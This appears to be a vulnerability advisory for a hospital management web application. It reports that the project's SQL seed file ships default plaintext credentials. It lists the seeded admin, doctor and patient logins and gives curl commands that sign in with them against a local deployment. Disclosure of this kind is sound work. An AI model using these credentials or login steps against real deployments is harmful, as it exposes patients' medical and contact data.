## Title

`myhmsdb.sql` ships a fully-populated user table with weak, identical username/password pairs (e.g. `admin/admin123`, `ashok/ashok123`)

### Summary

The repository includes a `myhmsdb.sql` file that creates the `admintb`, `doctb`, and `patreg` tables and pre-populates them with default credentials. The receptionist account is `admin/admin123`, the doctor accounts are `ashok/ashok123`, `arun/arun123`, `Dinesh/dinesh123`, etc., and the patient accounts are `ram@gmail.com/ram123`, `alia@gmail.com/alia123`, etc. Anyone who pulls the project and runs the SQL seed file gets those credentials working immediately, and the same credentials are also reused in the documentation that ships with the project. There is no forced password rotation on first login.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Use of Default Credentials (CWE-1392)

### Affected Code

File: `myhmsdb.sql`

```sql
INSERT INTO `admintb` (`username`, `password`) VALUES
('admin', 'admin123');

INSERT INTO `doctb` (`username`, `password`, `email`, `spec`, `docFees`) VALUES
('ashok', 'ashok123', 'ashok@gmail.com', 'General', 500),
('arun', 'arun123', 'arun@gmail.com', 'Cardiologist', 600),
('Dinesh', 'dinesh123', 'dinesh@gmail.com', 'General', 700),
('Ganesh', 'ganesh123', 'ganesh@gmail.com', 'Pediatrician', 550),
('Kumar', 'kumar123', 'kumar@gmail.com', 'Pediatrician', 800),
('Amit', 'amit123', 'amit@gmail.com', 'Cardiologist', 1000),
('Abbis', 'abbis123', 'abbis@gmail.com', 'Neurologist', 1500),
('Tiwary', 'tiwary123', 'tiwary@gmail.com', 'Pediatrician', 450);

INSERT INTO `patreg` (`pid`, `fname`, `lname`, `gender`, `email`, `contact`, `password`, `cpassword`) VALUES
(1, 'Ram', 'Kumar', 'Male', 'ram@gmail.com', '9876543210', 'ram123', 'ram123'),
(2, 'Alia', 'Bhatt', 'Female', 'alia@gmail.com', '8976897689', 'alia123', 'alia123'),
...
(11, 'Shraddha', 'Kapoor', 'Female', 'shraddha@gmail.com', '9768946252', 'shraddha123', 'shraddha123');
```

### Root Cause

The seed data is part of the application bundle. There is no installation step that requires the operator to change the admin password, and the credentials are reused in the project README to give reviewers a working demo. Because the login handlers compare credentials using string equality against `doctb.password` / `admintb.password` / `patreg.password`, the seeded credentials are valid indefinitely.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Log in as the receptionist using the seeded credentials:

```bash
curl -sS -i "$BASE_URL/func3.php" \
  --data-urlencode "adsub=1" \
  --data-urlencode "username1=admin" \
  --data-urlencode "password2=admin123" | head -10
```

```text
HTTP/1.1 302 Found
Location: admin-panel1.php
```

3. Log in as the doctor `ashok` using the seeded credentials:

```bash
curl -sS -i "$BASE_URL/func1.php" \
  --data-urlencode "docsub1=1" \
  --data-urlencode "username3=ashok" \
  --data-urlencode "password3=ashok123" | head -10
```

```text
HTTP/1.1 302 Found
Location: doctor-panel.php
```

4. Log in as the patient `ram@gmail.com` using the seeded credentials:

```bash
curl -sS -i "$BASE_URL/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=ram@gmail.com" \
  --data-urlencode "password2=ram123" | head -10
```

```text
HTTP/1.1 302 Found
Location: admin-panel.php
```

5. The same credentials are stored in plaintext in `myhmsdb.sql`, so any deployment that has been initialised from the seed file is exposed.

### Impact

Any deployment that has not changed the seeded credentials is trivially compromised:

- The receptionist account (`admin/admin123`) gives full access to patient/doctor/appointment/prescription/contact data and to add/delete doctor actions.
- The doctor accounts give access to the appointments list and the prescription list (including the patient email and contact number).
- The patient accounts give access to the appointment booking and the patient's own prescription records.

Combined with the missing authentication on the dashboard endpoints (CVE-09), the missing rate limiting (CVE-17), and the SQL injection in the login handlers (CVE-01), the default credentials are a one-step compromise.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)
```
